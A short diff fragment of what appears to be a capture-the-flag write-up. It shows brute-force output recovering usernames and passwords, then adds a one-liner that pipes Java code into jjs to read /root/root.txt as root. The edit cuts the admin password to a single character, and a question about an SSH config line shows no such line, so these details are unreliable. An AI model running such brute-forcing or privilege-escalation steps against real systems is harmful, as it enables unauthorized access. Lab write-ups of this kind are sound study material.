@@ -12,11 +12,22 @@ Starting brute-force attack...
 [+] Found user: admi                        
 [+] Found user: admin                        
 [+] User found: admin                         
-[+] Found password for admin: t9KcS3>!0B#2        
+[+] Found password for admin: c        
 [+] Found user: ma                        
 [+] Found user: man                        
 [+] Found user: mang                        
 [+] Found user: mango                        
 [+] User found: mango                         
 [+] Found password for mango: h3mXK8RhU~f{]f5H
+```
+
+```txt
+Given that I had the correct password for admin, why did SSH fail? The last line of /etc/ssh/sshd_config:
+```
+
+```bash
+echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
 ```
